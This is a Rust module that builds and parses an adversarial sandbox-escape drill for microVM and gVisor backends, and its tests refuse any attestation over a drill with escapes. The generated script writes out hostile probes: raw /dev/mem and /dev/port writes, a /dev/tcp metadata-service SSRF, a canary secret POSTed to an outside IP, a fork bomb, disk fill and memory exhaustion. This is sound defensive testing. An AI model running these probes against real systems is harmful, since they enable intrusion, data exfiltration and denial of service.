use serde::{Deserialize, Serialize};

pub const CORPUS_VERSION: u32 = 2;

pub const MEMHOG_ID: &str = "Mx_memhog";

pub const MEMHOG_BYTES: u64 = 1024 * 1024 * 1024;

pub const BEGIN_MARKER: &str = "CORPUS_BEGIN";
pub const END_MARKER: &str = "CORPUS_END";

#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum AttackFamily {
    KernelExploit,
    CloudMetadataSsrf,
    ControlPlaneReach,
    CrossTenant,
    SecretExfil,
    ForkBomb,
    DiskFill,
    MemHog,
}

impl AttackFamily {
    pub fn key(self) -> &'static str {
        match self {
            AttackFamily::KernelExploit => "kernel_exploit",
            AttackFamily::CloudMetadataSsrf => "cloud_metadata_ssrf",
            AttackFamily::ControlPlaneReach => "control_plane_reach",
            AttackFamily::CrossTenant => "cross_tenant",
            AttackFamily::SecretExfil => "secret_exfil",
            AttackFamily::ForkBomb => "fork_bomb",
            AttackFamily::DiskFill => "disk_fill",
            AttackFamily::MemHog => "mem_hog",
        }
    }

    pub fn all() -> &'static [AttackFamily] {
        &[
            AttackFamily::KernelExploit,
            AttackFamily::CloudMetadataSsrf,
            AttackFamily::ControlPlaneReach,
            AttackFamily::CrossTenant,
            AttackFamily::SecretExfil,
            AttackFamily::ForkBomb,
            AttackFamily::DiskFill,
            AttackFamily::MemHog,
        ]
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct AttackMarker {
    pub id: &'static str,
    pub family: AttackFamily,
}

pub const CORPUS: &[AttackMarker] = &[
    AttackMarker {
        id: "K1_module",
        family: AttackFamily::KernelExploit,
    },
    AttackMarker {
        id: "K2_devmem",
        family: AttackFamily::KernelExploit,
    },
    AttackMarker {
        id: "K3_ioport",
        family: AttackFamily::KernelExploit,
    },
    AttackMarker {
        id: "K4_mount",
        family: AttackFamily::KernelExploit,
    },
    AttackMarker {
        id: "M1_metadata_ssrf",
        family: AttackFamily::CloudMetadataSsrf,
    },
    AttackMarker {
        id: "C1_controlplane",
        family: AttackFamily::ControlPlaneReach,
    },
    AttackMarker {
        id: "T1_crosstenant",
        family: AttackFamily::CrossTenant,
    },
    AttackMarker {
        id: "E1_secret_exfil",
        family: AttackFamily::SecretExfil,
    },
    AttackMarker {
        id: "F1_forkbomb",
        family: AttackFamily::ForkBomb,
    },
    AttackMarker {
        id: "D1_root_readonly",
        family: AttackFamily::DiskFill,
    },
    AttackMarker {
        id: "D2_diskfill",
        family: AttackFamily::DiskFill,
    },
    AttackMarker {
        id: MEMHOG_ID,
        family: AttackFamily::MemHog,
    },
];

pub fn build_corpus_script(pids_max: u32) -> String {
    format!(
        r#"# AG-D4 / CI-T1 adversarial escape corpus (corpus_version={cv})
mount -t proc proc /proc 2>/dev/null
mount -t sysfs sys /sys 2>/dev/null
mount -t tmpfs -o size=8m tmpfs /run 2>/dev/null
mount -t cgroup2 cg2 /sys/fs/cgroup 2>/dev/null
echo "{begin} corpus_version={cv} kernel=$(uname -r 2>/dev/null) guest_euid=$EUID"

cat > /run/k.sh <<'ATK_EOF'
if modprobe dummy 2>/dev/null || insmod /x.ko 2>/dev/null; then echo "K1_module ESCAPED"; else echo "K1_module CONTAINED"; fi
if dd if=/dev/zero of=/dev/mem bs=1 count=1 seek=1048576 2>/dev/null; then echo "K2_devmem ESCAPED"; else echo "K2_devmem CONTAINED"; fi
if dd if=/dev/zero of=/dev/port bs=1 count=1 2>/dev/null; then echo "K3_ioport ESCAPED"; else echo "K3_ioport CONTAINED"; fi
if mount -t tmpfs none /proc/sys 2>/dev/null; then echo "K4_mount ESCAPED"; else echo "K4_mount CONTAINED"; fi
ATK_EOF
setpriv --no-new-privs --bounding-set -all --inh-caps -all --ambient-caps -all /bin/bash /run/k.sh 2>/dev/null

if timeout 3 bash -c 'exec 3<>/dev/tcp/169.254.169.254/80; printf "GET /latest/meta-data/ HTTP/1.0\r\n\r\n">&3' 2>/dev/null; then echo "M1_metadata_ssrf ESCAPED"; else echo "M1_metadata_ssrf CONTAINED"; fi

if timeout 3 bash -c 'exec 3<>/dev/tcp/10.0.0.1/8080' 2>/dev/null; then echo "C1_controlplane ESCAPED"; else echo "C1_controlplane CONTAINED"; fi

if timeout 3 bash -c 'exec 3<>/dev/tcp/192.168.13.37/443' 2>/dev/null; then echo "T1_crosstenant ESCAPED"; else echo "T1_crosstenant CONTAINED"; fi

SECRET="myelin-drill-canary-$$"
if timeout 3 bash -c "exec 3<>/dev/tcp/93.184.216.34/80; printf 'POST %s' '$SECRET'>&3" 2>/dev/null; then echo "E1_secret_exfil ESCAPED"; else echo "E1_secret_exfil CONTAINED"; fi

mkdir -p /sys/fs/cgroup/drill 2>/dev/null
echo "+pids" > /sys/fs/cgroup/cgroup.subtree_control 2>/dev/null
echo {pids_max} > /sys/fs/cgroup/drill/pids.max 2>/dev/null
PMAX=$(cat /sys/fs/cgroup/drill/pids.max 2>/dev/null)
( echo $BASHPID > /sys/fs/cgroup/drill/cgroup.procs 2>/dev/null; while : ; do /bin/sleep 60 & done ) 2>/dev/null &
BOMB=$!
n=0; while [ $n -lt 25 ]; do n=$((n+1)); sleep 0.1 2>/dev/null; done
PEAK=$(cat /sys/fs/cgroup/drill/pids.current 2>/dev/null)
REFUSED=$(awk '/^max/{{print $2}}' /sys/fs/cgroup/drill/pids.events 2>/dev/null)
kill $BOMB 2>/dev/null
if [ "${{PEAK:-9999}}" -le "${{PMAX:-0}}" ] && [ "${{REFUSED:-0}}" -gt 0 ]; then echo "F1_forkbomb CONTAINED peak=$PEAK ceiling=$PMAX refused=$REFUSED"; else echo "F1_forkbomb ESCAPED peak=$PEAK ceiling=$PMAX"; fi

if echo x 2>/dev/null > /root_write_probe; then echo "D1_root_readonly ESCAPED"; rm -f /root_write_probe 2>/dev/null; else echo "D1_root_readonly CONTAINED"; fi
mount -t tmpfs -o size=4m tmpfs /run/scratch 2>/dev/null || mkdir -p /run/scratch
dd if=/dev/zero of=/run/scratch/fill bs=1M count=64 2>/dev/null; rc=$?
if [ $rc -ne 0 ]; then echo "D2_diskfill CONTAINED enospc_rc=$rc"; else echo "D2_diskfill ESCAPED"; fi

echo "{memhog_id} ATTEMPT bytes={hog}"
echo "{end}"
( S=aaaaaaaaaaaaaaaa; n=0; while [ $n -lt 26 ]; do S="$S$S"; n=$((n+1)); done; echo "{memhog_id} ESCAPED held=${{#S}}" ) 2>/dev/null
echo "{memhog_id} CONTAINED in_guest_oom"
sync
reboot -f
"#,
        cv = CORPUS_VERSION,
        begin = BEGIN_MARKER,
        end = END_MARKER,
        pids_max = pids_max,
        memhog_id = MEMHOG_ID,
        hog = MEMHOG_BYTES,
    )
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub enum AttackOutcome {
    Contained,
    Escaped,
    DidNotRun,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct DrillReport {
    pub outcomes: Vec<(&'static str, AttackFamily, AttackOutcome)>,
    pub corpus_completed: bool,
}

impl DrillReport {
    pub fn escapes(&self) -> usize {
        self.outcomes
            .iter()
            .filter(|(_, _, o)| *o == AttackOutcome::Escaped)
            .count()
    }

    pub fn did_not_run(&self) -> usize {
        self.outcomes
            .iter()
            .filter(|(_, _, o)| *o == AttackOutcome::DidNotRun)
            .count()
    }

    pub fn contained_by_family(&self, family: AttackFamily) -> u32 {
        self.outcomes
            .iter()
            .filter(|(_, f, o)| *f == family && *o == AttackOutcome::Contained)
            .count() as u32
    }

    pub fn is_green(&self) -> bool {
        self.corpus_completed && self.escapes() == 0 && self.did_not_run() == 0
    }

    pub fn summary(&self) -> String {
        let mut s = format!(
            "AG-D4 drill: {} attacks | escapes={} did_not_run={} corpus_completed={}\n",
            self.outcomes.len(),
            self.escapes(),
            self.did_not_run(),
            self.corpus_completed
        );
        for (id, fam, outcome) in &self.outcomes {
            s.push_str(&format!("  {id:<20} [{:<20}] {outcome:?}\n", fam.key()));
        }
        s
    }
}

pub fn parse_console(console: &str) -> DrillReport {
    let corpus_completed = console.contains(END_MARKER);
    let outcomes = CORPUS
        .iter()
        .map(|atk| {
            let mut outcome = AttackOutcome::DidNotRun;
            for line in console.lines() {
                let mut toks = line.split_whitespace();
                let Some(first) = toks.next() else { continue };
                if first != atk.id {
                    continue;
                }
                match toks.next() {
                    Some("CONTAINED") => {
                        outcome = AttackOutcome::Contained;
                        break;
                    }
                    Some("ESCAPED") => {
                        outcome = AttackOutcome::Escaped;
                        break;
                    }
                    Some("ATTEMPT") if atk.id == MEMHOG_ID => {
                        outcome = AttackOutcome::Contained;
                    }
                    _ => {}
                }
            }
            (atk.id, atk.family, outcome)
        })
        .collect();
    DrillReport {
        outcomes,
        corpus_completed,
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub enum Backend {
    FirecrackerMicrovm,
    GvisorRunsc,
}

impl Backend {
    pub fn key(self) -> &'static str {
        match self {
            Backend::FirecrackerMicrovm => "firecracker(microVM/KVM)",
            Backend::GvisorRunsc => "gvisor(runsc)",
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct BackendRun {
    pub backend: Backend,
    pub exercised: bool,
    pub residual_note: Option<String>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct EscapeAttestation {
    pub artifact: String,
    pub drill: String,
    pub date: String,
    pub backends: Vec<BackendRun>,
    pub gate_backend: Backend,
    pub rootfs_sha256: String,
    pub kernel_sha256: String,
    pub kernel_version: String,
    pub corpus_version: u32,
    pub contained_by_family: Vec<(String, u32)>,
    pub total_escapes: u32,
    pub total_attacks: u32,
    pub residuals: Vec<String>,
}

impl EscapeAttestation {
    pub fn residuals() -> Vec<String> {
        vec![
            "ZERO-escapes is BOTH the floor and the full answer - there is NO mutation-score / \
             threshold floor below it; it is a PERMANENT GATE re-run on every backend/image/kernel \
             change forever (untrusted-code execution is a never-\"done\" surface, EI-04 §5)."
                .to_string(),
            "gVisor (runsc) re-runs THIS SAME drill as the named second backend - CI-P28."
                .to_string(),
            "The M4-boundary re-confirm on the prod CI image is CI-P27 / P-348 (agent-side AG-P21)."
                .to_string(),
            "Continuous fuzzing + the full CVE corpus + a pre-GA third-party pentest remain ongoing \
             residuals on top of this gate (never \"done\")."
                .to_string(),
        ]
    }

    #[allow(clippy::too_many_arguments)]
    pub fn from_green_drill(
        date: impl Into<String>,
        report: &DrillReport,
        backends: Vec<BackendRun>,
        gate_backend: Backend,
        rootfs_sha256: impl Into<String>,
        kernel_sha256: impl Into<String>,
        kernel_version: impl Into<String>,
    ) -> Result<EscapeAttestation, String> {
        if !report.is_green() {
            return Err(format!(
                "REFUSING to mint a green attestation over a non-green drill \
                 (escapes={}, did_not_run={}, corpus_completed={}). A red AG-D4 is a dated no-go, \
                 never a weakened threshold.",
                report.escapes(),
                report.did_not_run(),
                report.corpus_completed
            ));
        }
        let contained_by_family = AttackFamily::all()
            .iter()
            .map(|f| (f.key().to_string(), report.contained_by_family(*f)))
            .collect();
        Ok(EscapeAttestation {
            artifact: "ag-d4-green-escape-attestation".to_string(),
            drill: "AG-D4 / CI-T1".to_string(),
            date: date.into(),
            backends,
            gate_backend,
            rootfs_sha256: rootfs_sha256.into(),
            kernel_sha256: kernel_sha256.into(),
            kernel_version: kernel_version.into(),
            corpus_version: CORPUS_VERSION,
            contained_by_family,
            total_escapes: 0,
            total_attacks: report.outcomes.len() as u32,
            residuals: EscapeAttestation::residuals(),
        })
    }

    pub fn green_line(&self) -> String {
        let exercised: Vec<&str> = self
            .backends
            .iter()
            .filter(|b| b.exercised)
            .map(|b| b.backend.key())
            .collect();
        format!(
            "[AG-D4 GREEN] {date} drill={drill} gate-backend={gate} exercised={exercised:?} \
             kernel={kver} rootfs-sha256={rootfs:.16}… corpus-version={cv} \
             total-attacks={ta} total-escapes={te}",
            date = self.date,
            drill = self.drill,
            gate = self.gate_backend.key(),
            exercised = exercised,
            kver = self.kernel_version,
            rootfs = self.rootfs_sha256,
            cv = self.corpus_version,
            ta = self.total_attacks,
            te = self.total_escapes,
        )
    }

    pub fn to_json(&self) -> String {
        serde_json::to_string_pretty(self).expect("EscapeAttestation is always serializable")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn green_console() -> String {
        let mut s = format!("{BEGIN_MARKER} corpus_version=1 kernel=6.1.168 guest_euid=0\n");
        for atk in CORPUS {
            s.push_str(&format!("{} CONTAINED extra=stuff\n", atk.id));
        }
        s.push_str(&format!("{END_MARKER}\n"));
        s
    }

    #[test]
    fn the_corpus_catalogue_and_the_generated_script_stay_in_lockstep() {
        let script = build_corpus_script(64);
        for atk in CORPUS {
            assert!(
                script.contains(atk.id),
                "catalogued attack `{}` is missing from the generated corpus script",
                atk.id
            );
        }
        assert!(script.contains(BEGIN_MARKER));
        assert!(script.contains(END_MARKER));
        assert!(script.contains("/sys/fs/cgroup/drill/pids.max"));
        assert!(script.contains("> /sys/fs/cgroup/drill/pids.max"));
        assert!(script.contains("echo 64 >") || script.contains("echo 64>"));
        assert!(script.contains("setpriv --no-new-privs"));
        let attempt = script
            .find(&format!("{MEMHOG_ID} ATTEMPT"))
            .expect("memhog ATTEMPT sentinel");
        let end = script.find(END_MARKER).expect("END marker");
        assert!(
            attempt < end,
            "the memhog ATTEMPT sentinel must precede the END marker"
        );
        assert!(script.contains(r#"S="$S$S""#) && script.contains("while [ $n -lt 26 ]"));
        assert_eq!(
            MEMHOG_BYTES,
            16 * (1u64 << 26),
            "the ATTEMPT byte count matches the allocator"
        );
    }

    #[test]
    fn all_eight_families_are_represented_in_the_corpus() {
        for fam in AttackFamily::all() {
            assert!(
                CORPUS.iter().any(|a| a.family == *fam),
                "family {:?} has no catalogued attack",
                fam
            );
        }
    }

    #[test]
    fn parse_console_reports_green_on_an_all_contained_console() {
        let report = parse_console(&green_console());
        assert_eq!(report.escapes(), 0);
        assert_eq!(report.did_not_run(), 0);
        assert!(report.corpus_completed);
        assert!(report.is_green());
        let total: u32 = AttackFamily::all()
            .iter()
            .map(|f| report.contained_by_family(*f))
            .sum();
        assert_eq!(total as usize, CORPUS.len());
    }

    #[test]
    fn a_single_escape_makes_the_gate_red() {
        let mut console = green_console();
        console = console.replace("K2_devmem CONTAINED", "K2_devmem ESCAPED");
        let report = parse_console(&console);
        assert_eq!(report.escapes(), 1);
        assert!(!report.is_green(), "ANY escape ⇒ RED");
    }

    #[test]
    fn a_missing_marker_makes_the_gate_red_not_green() {
        let console = green_console().replace("M1_metadata_ssrf CONTAINED extra=stuff\n", "");
        let report = parse_console(&console);
        assert_eq!(report.did_not_run(), 1);
        assert_eq!(report.escapes(), 0);
        assert!(
            !report.is_green(),
            "a property not drilled is not proven ⇒ RED"
        );
    }

    #[test]
    fn a_truncated_console_without_the_end_marker_is_red() {
        let mut console = green_console();
        console = console.replace(&format!("{END_MARKER}\n"), "");
        let report = parse_console(&console);
        assert!(!report.corpus_completed);
        assert!(
            !report.is_green(),
            "no END marker ⇒ corpus did not complete ⇒ RED"
        );
    }

    #[test]
    fn family_keys_are_distinct_and_stable() {
        let keys: Vec<&str> = AttackFamily::all().iter().map(|f| f.key()).collect();
        assert!(
            keys.iter().all(|k| !k.is_empty()),
            "every family key is non-empty"
        );
        let mut sorted = keys.clone();
        sorted.sort_unstable();
        sorted.dedup();
        assert_eq!(sorted.len(), keys.len(), "family keys must be distinct");
        assert_eq!(AttackFamily::KernelExploit.key(), "kernel_exploit");
        assert_eq!(AttackFamily::ForkBomb.key(), "fork_bomb");
    }

    #[test]
    fn summary_names_every_attack_and_the_verdict_counts() {
        let report = parse_console(&green_console());
        let s = report.summary();
        assert!(s.contains("escapes=0"));
        assert!(s.contains("did_not_run=0"));
        assert!(s.contains("corpus_completed=true"));
        for atk in CORPUS {
            assert!(s.contains(atk.id), "summary must name attack `{}`", atk.id);
        }
    }

    #[test]
    fn substring_ids_do_not_false_match() {
        let mut console = green_console();
        console.push_str("XK2_devmem CONTAINED\n");
        console.push_str("note: K2_devmem was attempted\n");
        let report = parse_console(&console);
        let (_, _, k2) = report
            .outcomes
            .iter()
            .find(|(id, _, _)| *id == "K2_devmem")
            .unwrap();
        assert_eq!(*k2, AttackOutcome::Contained);
    }

    #[test]
    fn memhog_attempt_without_escaped_is_contained_structurally() {
        let mut s = format!("{BEGIN_MARKER} corpus_version={CORPUS_VERSION} guest_euid=65534\n");
        for atk in CORPUS {
            if atk.id == MEMHOG_ID {
                continue;
            }
            s.push_str(&format!("{} CONTAINED\n", atk.id));
        }
        s.push_str(&format!("{MEMHOG_ID} ATTEMPT bytes=1073741824\n"));
        s.push_str(&format!("{END_MARKER}\n"));
        let report = parse_console(&s);
        assert_eq!(*outcome_for(&report, MEMHOG_ID), AttackOutcome::Contained);
        assert_eq!(report.escapes(), 0);
        assert_eq!(report.did_not_run(), 0);
        assert!(report.corpus_completed);
        assert!(
            report.is_green(),
            "an ATTEMPT-only memhog (no ESCAPED) is structurally Contained ⇒ green"
        );
    }

    #[test]
    fn memhog_escaped_after_attempt_is_escaped() {
        let mut s = green_console();
        s = s.replace(
            &format!("{MEMHOG_ID} CONTAINED extra=stuff\n"),
            &format!("{MEMHOG_ID} ATTEMPT bytes=1073741824\n{MEMHOG_ID} ESCAPED held=1073741824\n"),
        );
        let report = parse_console(&s);
        assert_eq!(*outcome_for(&report, MEMHOG_ID), AttackOutcome::Escaped);
        assert_eq!(report.escapes(), 1);
        assert!(
            !report.is_green(),
            "a held anon-hog (the memory bound failed) ⇒ RED"
        );
    }

    #[test]
    fn memhog_with_no_marker_at_all_is_did_not_run() {
        let s = green_console().replace(&format!("{MEMHOG_ID} CONTAINED extra=stuff\n"), "");
        let report = parse_console(&s);
        assert_eq!(*outcome_for(&report, MEMHOG_ID), AttackOutcome::DidNotRun);
        assert_eq!(report.did_not_run(), 1);
        assert!(!report.is_green());
    }

    fn outcome_for<'a>(report: &'a DrillReport, id: &str) -> &'a AttackOutcome {
        &report
            .outcomes
            .iter()
            .find(|(i, _, _)| *i == id)
            .expect("attack id in the parsed catalogue")
            .2
    }

    #[test]
    fn attestation_is_refused_over_a_red_drill() {
        let mut console = green_console();
        console = console.replace("K1_module CONTAINED", "K1_module ESCAPED");
        let red = parse_console(&console);
        let r = EscapeAttestation::from_green_drill(
            "2026-06-21",
            &red,
            vec![BackendRun {
                backend: Backend::FirecrackerMicrovm,
                exercised: true,
                residual_note: None,
            }],
            Backend::FirecrackerMicrovm,
            "rootfs-sha",
            "kernel-sha",
            "6.1.168",
        );
        assert!(r.is_err(), "an attestation must NEVER describe a red drill");
    }

    #[test]
    fn attestation_over_a_green_drill_has_zero_escapes_and_the_named_residuals() {
        let report = parse_console(&green_console());
        let att = EscapeAttestation::from_green_drill(
            "2026-06-21",
            &report,
            vec![
                BackendRun {
                    backend: Backend::FirecrackerMicrovm,
                    exercised: true,
                    residual_note: None,
                },
                BackendRun {
                    backend: Backend::GvisorRunsc,
                    exercised: false,
                    residual_note: Some(
                        "runsc requires privileges this host lacks (no sudo)".into(),
                    ),
                },
            ],
            Backend::FirecrackerMicrovm,
            "7a2bc8ed2c64ed78994971439b00c234b1ce46d247123314d683df7579c77923",
            "467367e6b8e88323dd23dedae3119ade9c9fca6a102a84fc2155e3ef1bec00eb",
            "6.1.168",
        )
        .unwrap();
        assert_eq!(att.total_escapes, 0);
        assert_eq!(att.corpus_version, CORPUS_VERSION);
        assert_eq!(att.gate_backend, Backend::FirecrackerMicrovm);
        assert!(att
            .backends
            .iter()
            .any(|b| b.backend == Backend::FirecrackerMicrovm && b.exercised));
        assert!(att
            .backends
            .iter()
            .any(|b| b.backend == Backend::GvisorRunsc
                && !b.exercised
                && b.residual_note.is_some()));
        assert!(att.residuals.iter().any(|r| r.contains("PERMANENT GATE")));
        assert!(att.residuals.iter().any(|r| r.contains("CI-P28")));
        assert!(att
            .residuals
            .iter()
            .any(|r| r.contains("CI-P27") || r.contains("P-348")));
        assert!(att.green_line().starts_with("[AG-D4 GREEN]"));
        assert!(att.green_line().contains("total-escapes=0"));
        let json = att.to_json();
        let back: EscapeAttestation = serde_json::from_str(&json).unwrap();
        assert_eq!(att, back);
    }

    #[test]
    fn green_line_lists_only_actually_exercised_backends() {
        let report = parse_console(&green_console());
        let att = EscapeAttestation::from_green_drill(
            "2026-06-21",
            &report,
            vec![
                BackendRun {
                    backend: Backend::FirecrackerMicrovm,
                    exercised: true,
                    residual_note: None,
                },
                BackendRun {
                    backend: Backend::GvisorRunsc,
                    exercised: false,
                    residual_note: Some("no sudo".into()),
                },
            ],
            Backend::FirecrackerMicrovm,
            "r",
            "k",
            "6.1.168",
        )
        .unwrap();
        let line = att.green_line();
        assert!(line.contains("firecracker"));
        assert!(
            !line.contains("gvisor"),
            "a non-exercised backend must not be claimed green"
        );
    }
}
